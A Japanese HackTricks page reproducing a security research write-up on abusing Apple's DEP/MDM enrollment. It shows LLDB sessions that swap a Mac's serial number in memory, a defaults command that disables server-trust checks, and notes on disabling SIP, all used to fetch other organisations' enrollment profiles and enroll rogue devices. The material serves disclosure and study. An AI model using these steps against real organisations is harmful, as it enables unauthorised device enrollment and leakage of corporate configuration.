# 他の組織のデバイスを登録する

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングテクニックを共有する。

</details>

## イントロ

[**以前のコメント**](./#what-is-mdm-mobile-device-management)**にあるように**、組織にデバイスを登録するためには**その組織に属するシリアル番号が必要です**。デバイスが登録されると、多くの組織は新しいデバイスに機密データをインストールします：証明書、アプリケーション、WiFiパスワード、VPN設定[など](https://developer.apple.com/enterprise/documentation/Configuration-Profile-Reference.pdf)。\
したがって、登録プロセスが適切に保護されていない場合、これは攻撃者にとって危険な入り口になり得ます。

**以下の研究は** [**https://duo.com/labs/research/mdm-me-maybe**](https://duo.com/labs/research/mdm-me-maybe) **から取られています**

## プロセスの逆転

### DEPとMDMに関わるバイナリ

私たちの研究を通じて、以下を探求しました：

* **`mdmclient`**: OSがMDMサーバーと通信するために使用されます。macOS 10.13.3以前では、DEPチェックインをトリガーするためにも使用できます。
* **`profiles`**: macOSで設定プロファイルをインストール、削除、表示するために使用できるユーティリティです。macOS 10.13.4以降では、DEPチェックインをトリガーするためにも使用できます。
* **`cloudconfigurationd`**: デバイス登録クライアントデーモンで、DEP APIと通信しデバイス登録プロファイルを取得する責任があります。

DEPチェックインを開始するために`mdmclient`または`profiles`を使用する場合、_アクティベーションレコード_を取得するために`CPFetchActivationRecord`と`CPGetActivationRecord`関数が使用されます。`CPFetchActivationRecord`は[XPC](https://developer.apple.com/documentation/xpc)を通じて`cloudconfigurationd`に制御を委譲し、その後DEP APIから_アクティベーションレコード_を取得します。

`CPGetActivationRecord`は、利用可能であればキャッシュから_アクティベーションレコード_を取得します。これらの関数は、`/System/Library/PrivateFrameworks/Configuration Profiles.framework`にあるプライベート設定プロファイルフレームワークで定義されています。

### TeslaプロトコルとAbsintheスキームのリバースエンジニアリング

DEPチェックインプロセス中に、`cloudconfigurationd`は_iprofiles.apple.com/macProfile_から_アクティベーションレコード_を要求します。リクエストペイロードは、2つのキーと値のペアを含むJSON辞書です：
```
{
"sn": "",
action": "RequestProfileConfiguration
}
```
ペイロードは、"Absinthe"という内部名称のスキームを使用して署名および暗号化されます。暗号化されたペイロードは次にBase 64でエンコードされ、HTTP POSTのリクエストボディとして_iprofiles.apple.com/macProfile_に使用されます。

`cloudconfigurationd`では、_Activation Record_ の取得は `MCTeslaConfigurationFetcher` クラスによって処理されます。`[MCTeslaConfigurationFetcher enterState:]` からの一般的なフローは以下の通りです：
```
rsi = @selector(verifyConfigBag);
rsi = @selector(startCertificateFetch);
rsi = @selector(initializeAbsinthe);
rsi = @selector(startSessionKeyFetch);
rsi = @selector(establishAbsintheSession);
rsi = @selector(startConfigurationFetch);
rsi = @selector(sendConfigurationInfoToRemote);
rsi = @selector(sendFailureNoticeToRemote);
```
### DEPリクエストのMITM攻撃

_iProfiles.apple.com_ へのネットワークリクエストを [Charles Proxy](https://www.charlesproxy.com) を使用してプロキシする可能性を探りました。私たちの目標は、_iprofiles.apple.com/macProfile_ に送信されるペイロードを検査し、任意のシリアル番号を挿入してリクエストを再生することでした。以前に述べたように、`cloudconfigurationd` によってそのエンドポイントに送信されるペイロードは [JSON](https://www.json.org) 形式であり、2つのキーと値のペアを含んでいます。
```
{
"action": "RequestProfileConfiguration",
sn": "
}
```
APIは_[iprofiles.apple.com](https://iprofiles.apple.com)_で[Transport Layer Security](https://en.wikipedia.org/wiki/Transport\_Layer\_Security) (TLS)を使用しているため、そのホストのSSLリクエストのプレーンテキスト内容を見るためには、CharlesでSSLプロキシングを有効にする必要がありました。

しかし、`-[MCTeslaConfigurationFetcher connection:willSendRequestForAuthenticationChallenge:]`メソッドはサーバー証明書の有効性をチェックし、サーバー信頼が検証できない場合は中止します。
```
[ERROR] Unable to get activation record: Error Domain=MCCloudConfigurationErrorDomain Code=34011
"The Device Enrollment server trust could not be verified. Please contact your system
administrator." UserInfo={USEnglishDescription=The Device Enrollment server trust could not be
verified. Please contact your system administrator., NSLocalizedDescription=The Device Enrollment
server trust could not be verified. Please contact your system administrator.,
MCErrorType=MCFatalError}
```
上記のエラーメッセージは、キー`CLOUD_CONFIG_SERVER_TRUST_ERROR`を持つバイナリ _Errors.strings_ ファイルにあり、`/System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings`の場所に他の関連するエラーメッセージと共に配置されています。
```
$ cd /System/Library/CoreServices
$ rg "The Device Enrollment server trust could not be verified"
ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
<snip>
```
_Errors.strings_ ファイルは、組み込みの `plutil` コマンドを使用して[人間が読める形式で出力することができます](https://duo.com/labs/research/mdm-me-maybe#error_strings_output)。
```
$ plutil -p /System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
```
`MCTeslaConfigurationFetcher` クラスをさらに調査した結果、`com.apple.ManagedClient.cloudconfigurationd` プリファレンスドメイン上で `MCCloudConfigAcceptAnyHTTPSCertificate` 設定オプションを有効にすることで、このサーバー信頼の挙動を回避できることが明らかになりました。
```
loc_100006406:
rax = [NSUserDefaults standardUserDefaults];
rax = [rax retain];
r14 = [rax boolForKey:@"MCCloudConfigAcceptAnyHTTPSCertificate"];
r15 = r15;
[rax release];
if (r14 != 0x1) goto loc_10000646f;
```
`MCCloudConfigAcceptAnyHTTPSCertificate` 設定オプションは、`defaults` コマンドで設定できます。
```
sudo defaults write com.apple.ManagedClient.cloudconfigurationd MCCloudConfigAcceptAnyHTTPSCertificate -bool yes
```
SSLプロキシを_iprofiles.apple.com_に対して有効にし、`cloudconfigurationd`が任意のHTTPS証明書を受け入れるように設定した後、Charles Proxyでリクエストの中間者攻撃と再生を試みました。

しかし、_iprofiles.apple.com/macProfile_へのHTTP POSTリクエストのボディに含まれるペイロードはAbsinthe（`NACSign`）で署名および暗号化されているため、**プレーンテキストのJSONペイロードを任意のシリアル番号を含むように変更することは、それを復号する鍵を持っていない限り不可能です**。鍵はメモリ内に残っているため取得可能ですが、代わりに[LLDB](https://lldb.llvm.org)デバッガを使用して`cloudconfigurationd`の探索に移りました。

### DEPと連携するシステムバイナリのインストルメンテーション

_iprofiles.apple.com/macProfile_に任意のシリアル番号を自動的に送信するプロセスを自動化するために探索した最終的な方法は、DEP APIと直接または間接的に連携するネイティブバイナリをインストルメントすることでした。これには、[Hopper v4](https://www.hopperapp.com)と[Ida Pro](https://www.hex-rays.com/products/ida/)での`mdmclient`、`profiles`、`cloudconfigurationd`の初期探索と、`lldb`での長時間にわたるデバッグセッションが含まれていました。

この方法の利点の一つは、バイナリを変更して自分の鍵で再署名することに比べて、macOSに組み込まれたエンタイトルメントの制限を回避できることです。

**システム整合性保護**

macOSでシステムバイナリ（例えば`cloudconfigurationd`）をインストルメントするためには、[システム整合性保護](https://support.apple.com/en-us/HT204899)（SIP）を無効にする必要があります。SIPは、システムレベルのファイル、フォルダ、プロセスを改ざんから保護するセキュリティ技術で、デフォルトでOS X 10.11「El Capitan」以降で有効になっています。[SIPは無効にすることができます](https://developer.apple.com/library/archive/documentation/Security/Conceptual/System_Integrity_Protection_Guide/ConfiguringSystemIntegrityProtection/ConfiguringSystemIntegrityProtection.html)。リカバリーモードにブートし、Terminalアプリケーションで以下のコマンドを実行してから再起動します：
```
csrutil enable --without debug
```
SIPは有用なセキュリティ機能であり、非本番マシンでの研究やテスト目的以外では無効にすべきではないことに注意が必要です。また、ホストオペレーティングシステムではなく、非重要な仮想マシン上でこれを行うことが可能であり（推奨されています）。

**LLDBを使用したバイナリインストルメンテーション**

SIPを無効にした後、DEP APIとやり取りするシステムバイナリ、具体的には`cloudconfigurationd`バイナリのインストルメンテーションを進めることができました。`cloudconfigurationd`は実行に高い権限が必要なため、`lldb`を`sudo`で起動する必要があります。
```
$ sudo lldb
(lldb) process attach --waitfor --name cloudconfigurationd
```
```markdown
`lldb`が待機している間に、別のターミナルウィンドウで`sudo /usr/libexec/mdmclient dep nag`を実行することで`cloudconfigurationd`にアタッチできます。アタッチされると、以下のような出力が表示され、プロンプトでLLDBコマンドを入力できます。
```
```
Process 861 stopped
* thread #1, stop reason = signal SIGSTOP
<snip>
Target 0: (cloudconfigurationd) stopped.

Executable module set to "/usr/libexec/cloudconfigurationd".
Architecture set to: x86_64h-apple-macosx.
(lldb)
```
**デバイスシリアル番号の設定**

最初に調査したことの一つは、`mdmclient`と`cloudconfigurationd`をリバースエンジニアリングする際、システムシリアル番号を取得する責任があるコードでした。なぜなら、シリアル番号が最終的にデバイスの認証に責任を持つことがわかっていたからです。私たちの目標は、[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)から取得した後、メモリ内のシリアル番号を変更し、それが`cloudconfigurationd`が`macProfile`ペイロードを構築する際に使用されるようにすることでした。

`cloudconfigurationd`がDEP APIとの通信を最終的に担当しているにもかかわらず、システムシリアル番号が`mdmclient`内で直接取得または使用されているかどうかも調査しました。以下に示すように取得されたシリアル番号はDEP APIに送信されるものではありませんが、特定の設定オプションが有効になっている場合に使用されるハードコードされたシリアル番号を明らかにしました。
```
int sub_10002000f() {
if (sub_100042b6f() != 0x0) {
r14 = @"2222XXJREUF";
}
else {
rax = IOServiceMatching("IOPlatformExpertDevice");
rax = IOServiceGetMatchingServices(*(int32_t *)*_kIOMasterPortDefault, rax, &var_2C);
<snip>
}
rax = r14;
return rax;
}
```
システムのシリアル番号は、[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)から取得されますが、`sub_10002000f` の戻り値がゼロ以外の場合は、静的文字列 "2222XXJREUF" に設定されます。その関数を検査すると、「サーバーストレステストモード」が有効かどうかをチェックしているようです。
```
void sub_1000321ca(void * _block) {
if (sub_10002406f() != 0x0) {
*(int8_t *)0x100097b68 = 0x1;
sub_10000b3de(@"Server stress test mode enabled", rsi, rdx, rcx, r8, r9, stack[0]);
}
return;
}
```
```markdown
「サーバーストレステストモード」の存在を文書化しましたが、DEP APIに提示されるシリアル番号を変更することが目標だったため、これ以上探求しませんでした。代わりに、`r14`レジスタによって指し示されるシリアル番号を変更することで、テストしているマシン用ではない_Activation Record_を取得できるかどうかをテストしました。

次に、`cloudconfigurationd`内でシステムシリアル番号がどのように取得されるかを調べました。
```
```
int sub_10000c100(int arg0, int arg1, int arg2, int arg3) {
var_50 = arg3;
r12 = arg2;
r13 = arg1;
r15 = arg0;
rbx = IOServiceGetMatchingService(*(int32_t *)*_kIOMasterPortDefault, IOServiceMatching("IOPlatformExpertDevice"));
r14 = 0xffffffffffff541a;
if (rbx != 0x0) {
rax = sub_10000c210(rbx, @"IOPlatformSerialNumber", 0x0, &var_30, &var_34);
r14 = rax;
<snip>
}
rax = r14;
return rax;
}
```
上記のように、シリアル番号は[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)から`cloudconfigurationd`でも取得されます。

`lldb`を使用して、`IOServiceGetMatchingService`にブレークポイントを設定し、任意のシリアル番号を含む新しい文字列変数を作成して、`r14`レジスタを私たちが作成した変数のメモリアドレスを指すように書き換えることで、[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)から取得されるシリアル番号を変更することができました。
```
(lldb) breakpoint set -n IOServiceGetMatchingService
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --waitfor --name cloudconfigurationd
Process 2208 stopped
* thread #2, queue = 'com.apple.NSXPCListener.service.com.apple.ManagedClient.cloudconfigurationd',
stop reason = instruction step over frame #0: 0x000000010fd824d8
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd + 73
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd:
->  0x10fd824d8 <+73>: movl   %ebx, %edi
0x10fd824da <+75>: callq  0x10ffac91e               ; symbol stub for: IOObjectRelease
0x10fd824df <+80>: testq  %r14, %r14
0x10fd824e2 <+83>: jne    0x10fd824e7               ; <+88>
Target 0: (cloudconfigurationd) stopped.
(lldb) continue  # Will hit breakpoint at `IOServiceGetMatchingService`
# Step through the program execution by pressing 'n' a bunch of times and
# then 'po $r14' until we see the serial number.
(lldb) n
(lldb) po $r14
C02JJPPPQQQRR  # The system serial number retrieved from the `IORegistry`
# Create a new variable containing an arbitrary serial number and print the memory address.
(lldb) p/x @"C02XXYYZZNNMM"
(__NSCFString *) $79 = 0x00007fb6d7d05850 @"C02XXYYZZNNMM"
# Rewrite the `r14` register to point to our new variable.
(lldb) register write $r14 0x00007fb6d7d05850
(lldb) po $r14
# Confirm that `r14` contains the new serial number.
C02XXYYZZNNMM
```
**エクスプロイト：JSONシリアライズ前のプロファイルリクエスト辞書の変更**

次に、`macProfile`ペイロードに送信されるシリアル番号を異なる方法で設定しようとしました。今回は、[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)を介して取得されるシステムシリアル番号を変更するのではなく、Absinthe（`NACSign`）で署名される前に、まだプレーンテキストであるシリアル番号がコード内でどこにあるかを探しました。最適なポイントは`-[MCTeslaConfigurationFetcher startConfigurationFetch]`で、大まかに以下のステップを実行します：

* 新しい`NSMutableData`オブジェクトを作成する
* `[MCTeslaConfigurationFetcher setConfigurationData:]`を呼び出し、新しい`NSMutableData`オブジェクトを渡す
* `[MCTeslaConfigurationFetcher profileRequestDictionary]`を呼び出し、以下の二つのキーと値のペアを含む`NSDictionary`オブジェクトを返す：
  * `sn`：システムシリアル番号
  * `action`：実行するリモートアクション（`sn`が引数）
* `[NSJSONSerialization dataWithJSONObject:]`を呼び出し、`profileRequestDictionary`から得られた`NSDictionary`を渡す
* JSONペイロードをAbsinthe（`NACSign`）で署名する
* 署名されたJSONペイロードをBase64エンコードする
* HTTPメソッドを`POST`に設定する
* HTTPボディをBase64エンコードされた署名済みJSONペイロードに設定する
* HTTPヘッダー`X-Profile-Protocol-Version`を`1`に設定する
* HTTPヘッダー`User-Agent`を`ConfigClient-1.0`に設定する
* `[NSURLConnection alloc] initWithRequest:delegate:startImmediately:]`メソッドを使用してHTTPリクエストを実行する

次に、JSONに変換される前の`profileRequestDictionary`から返される`NSDictionary`オブジェクトを変更しました。これを行うために、できるだけ未変換のデータに近づくために`dataWithJSONObject`にブレークポイントを設定しました。ブレークポイントは成功し、ディスアセンブリを通じて知っていたレジスタ（`rdx`）の内容を出力したとき、期待していた結果が得られました。
```
po $rdx
{
action = RequestProfileConfiguration;
sn = C02XXYYZZNNMM;
}
```
以下は、`[MCTeslaConfigurationFetcher profileRequestDictionary]`によって返される`NSDictionary`オブジェクトの整形された表現です。次の課題は、シリアル番号を含むメモリ内の`NSDictionary`を変更することでした。
```
(lldb) breakpoint set -r "dataWithJSONObject"
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --name "cloudconfigurationd" --waitfor
Process 3291 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x00007fff2e8bfd8f Foundation`+[NSJSONSerialization dataWithJSONObject:options:error:]
Target 0: (cloudconfigurationd) stopped.
# Hit next breakpoint at `dataWithJSONObject`, since the first one isn't where we need to change the serial number.
(lldb) continue
# Create a new variable containing an arbitrary `NSDictionary` and print the memory address.
(lldb) p/x (NSDictionary *)[[NSDictionary alloc] initWithObjectsAndKeys:@"C02XXYYZZNNMM", @"sn",
@"RequestProfileConfiguration", @"action", nil]
(__NSDictionaryI *) $3 = 0x00007ff068c2e5a0 2 key/value pairs
# Confirm that `rdx` contains the new `NSDictionary`.
po $rdx
{
action = RequestProfileConfiguration;
sn = <new_serial_number>
}
```
上記のリストは以下の操作を行います：

* `dataWithJSONObject` セレクターの正規表現ブレークポイントを作成する
* `cloudconfigurationd` プロセスの開始を待ち、それにアタッチする
* プログラムの実行を `continue` する（最初にヒットする `dataWithJSONObject` のブレークポイントは `profileRequestDictionary` で呼び出されるものではないため）
* 任意の `NSDictionary` を作成し、（16進数形式で `/x` により）その結果を出力する
* 必要なキーの名前は既に分かっているので、`sn` に選択したシリアル番号を単純に設定し、アクションはそのままにする
* この新しい `NSDictionary` を作成した結果の出力は、特定のメモリ位置に2つのキー値ペアがあることを教えてくれる

最終ステップは、選択したシリアル番号を含むカスタム `NSDictionary` オブジェクトのメモリ位置を `rdx` に書き込むという同じステップを繰り返すことでした：
```
(lldb) register write $rdx 0x00007ff068c2e5a0  # Rewrite the `rdx` register to point to our new variable
(lldb) continue
```
```markdown
この操作は、`rdx` レジスタを新しい `NSDictionary` にポイントさせ、それが [JSON](https://www.json.org) にシリアライズされて _iprofiles.apple.com/macProfile_ に `POST` される直前に行います。その後、プログラムの流れを `continue` で進めます。

JSONにシリアライズされる前にプロファイルリクエスト辞書内のシリアル番号を変更するこの方法は成功しました。既知の良好なDEP登録済みAppleシリアル番号を(null)の代わりに使用したところ、`ManagedClient` のデバッグログにはデバイスの完全なDEPプロファイルが表示されました：
```
```
Apr  4 16:21:35[660:1]:+CPFetchActivationRecord fetched configuration:
{
AllowPairing = 1;
AnchorCertificates =     (
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://some.url/cloudenroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "Org address";
OrganizationAddressLine1 = "More address";
OrganizationAddressLine2 = NULL;
OrganizationCity = A City;
OrganizationCountry = US;
OrganizationDepartment = "Org Dept";
OrganizationEmail = "dep.management@org.url";
OrganizationMagic = <unique string>;
OrganizationName = "ORG NAME";
OrganizationPhone = "+1551234567";
OrganizationSupportPhone = "+15551235678";
OrganizationZipCode = "ZIPPY";
SkipSetup =     (
AppleID,
Passcode,
Zoom,
Biometric,
Payment,
TOS,
TapToSetup,
Diagnostics,
HomeButtonSensitivity,
Android,
Siri,
DisplayTone,
ScreenSaver
);
SupervisorHostCertificates =     (
);
}
```
以下の `lldb` コマンドを使用することで、任意のシリアル番号を挿入し、組織固有のデータを含むDEPプロファイルを取得することができます。これには、組織のMDM登録URLも含まれます。議論したように、この登録URLを使用して、シリアル番号がわかっている悪質なデバイスを登録することができます。他のデータは、悪質な登録を社会工学的に行うために使用される可能性があります。登録されたデバイスは、証明書、プロファイル、アプリケーション、VPN設定など、さまざまなものを受け取る可能性があります。

### Pythonを使用した`cloudconfigurationd`の自動化

有効なDEPプロファイルをシリアル番号だけで取得する方法を示す初期の実証例を持っていた後、攻撃者がこの認証の弱点をどのように悪用するかを示すために、このプロセスを自動化することにしました。

幸いなことに、LLDB APIはPythonで[スクリプトブリッジインターフェース](https://lldb.llvm.org/python-reference.html)を通じて利用可能です。[Xcode Command Line Tools](https://developer.apple.com/download/more/)がインストールされているmacOSシステムでは、次のようにして`lldb` Pythonモジュールをインポートできます：
```
import lldb
```
以下は、DEPに登録されたシリアル番号を挿入し、有効なDEPプロファイルを返す方法を示す概念実証をスクリプト化することを比較的容易にしました。私たちが開発したPoCは、改行で区切られたシリアル番号のリストを取り、DEPプロファイルをチェックするために`cloudconfigurationd`プロセスに注入します。

![Charles SSL Proxying Settings.](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2NoYXJsZXNfc3NsX3Byb3h5aW5nX3NldHRpbmdzLnBuZw==?w=800\&fit=contain\&s=d1c9216716bf619e7e10e45c9968f83b)

![DEP Notification.](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2RlcF9ub3RpZmljYXRpb24ucG5n?w=800\&fit=contain\&s=4f7b95efd02245f9953487dcaac6a961)

### 影響

Appleのデバイス登録プログラムが悪用され、組織に関する機密情報が漏れる可能性のあるシナリオはいくつかあります。最も明白なシナリオの2つは、デバイスが所属する組織に関する情報を取得することであり、これはDEPプロファイルから取得できます。2つ目は、この情報を使用して不正なDEPおよびMDM登録を実行することです。これらについては以下でさらに詳しく説明します。

#### 情報開示

以前に述べたように、DEP登録プロセスの一部には、DEP APIから_アクティベーションレコード_（またはDEPプロファイル）を要求し、受け取ることが含まれます。有効なDEP登録システムのシリアル番号を提供することで、以下の情報を取得できます（macOSのバージョンによっては、`stdout`に印刷されるか、`ManagedClient`ログに書き込まれます）。
```
Activation record: {
AllowPairing = 1;
AnchorCertificates =     (
<array_of_der_encoded_certificates>
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://example.com/enroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "123 Main Street, Anywhere, , 12345 (USA)";
OrganizationAddressLine1 = "123 Main Street";
OrganizationAddressLine2 = NULL;
OrganizationCity = Anywhere;
OrganizationCountry = USA;
OrganizationDepartment = "IT";
OrganizationEmail = "dep@example.com";
OrganizationMagic = 105CD5B18CE24784A3A0344D6V63CD91;
OrganizationName = "Example, Inc.";
OrganizationPhone = "+15555555555";
OrganizationSupportPhone = "+15555555555";
OrganizationZipCode = "12345";
SkipSetup =     (
<array_of_setup_screens_to_skip>
);
SupervisorHostCertificates =     (
);
}
```
```markdown
特定の組織についてはこの情報が公開されている場合もありますが、組織が所有するデバイスのシリアル番号とDEPプロファイルから得られた情報を組み合わせることで、組織のヘルプデスクやITチームに対して、パスワードリセットの要求や、会社のMDMサーバーへのデバイス登録の支援など、さまざまなソーシャルエンジニアリング攻撃を行うことができます。

#### Rogue DEP Enrollment

[Apple MDMプロトコル](https://developer.apple.com/enterprise/documentation/MDM-Protocol-Reference.pdf)は、[HTTP Basic認証](https://en.wikipedia.org/wiki/Basic\_access\_authentication)を介してMDM登録を行う前のユーザー認証をサポートしていますが、必須ではありません。**認証がなければ、DEPに登録された有効なシリアル番号があれば、MDMサーバーにデバイスを登録するだけです**。したがって、攻撃者がそのようなシリアル番号を入手すると（[OSINT](https://en.wikipedia.org/wiki/Open-source\_intelligence)、ソーシャルエンジニアリング、またはブルートフォースによって）、それが現在MDMサーバーに登録されていない限り、組織が所有するかのように自分のデバイスを登録することができます。基本的に、攻撃者が実際のデバイスよりも先にDEP登録を開始することに成功すれば、そのデバイスのアイデンティティを引き継ぐことができます。

組織はMDMを利用して、デバイスやユーザーの証明書、VPN設定データ、登録エージェント、Configuration Profiles、その他の内部データや組織の秘密を展開することがあります。さらに、一部の組織はMDM登録の一環としてユーザー認証を要求しないことを選択しています。これには、より良いユーザーエクスペリエンスや、[企業ネットワーク外で行われるMDM登録を処理するためにMDMサーバーに内部認証サーバーを露出させる必要がない](https://docs.simplemdm.com/article/93-ldap-authentication-with-apple-dep)などの利点があります。

しかし、MDM登録のためにDEPを活用する場合、攻撃者が自分の選んだエンドポイントを組織のMDMサーバーに登録できるという問題が発生します。さらに、攻撃者がMDMに自分の選んだエンドポイントを成功裏に登録すると、ネットワーク内でさらにピボットするために使用できる特権アクセスを得る可能性があります。

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの**会社を広告したい、または**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加するか、**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**に**フォローしてください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>
```
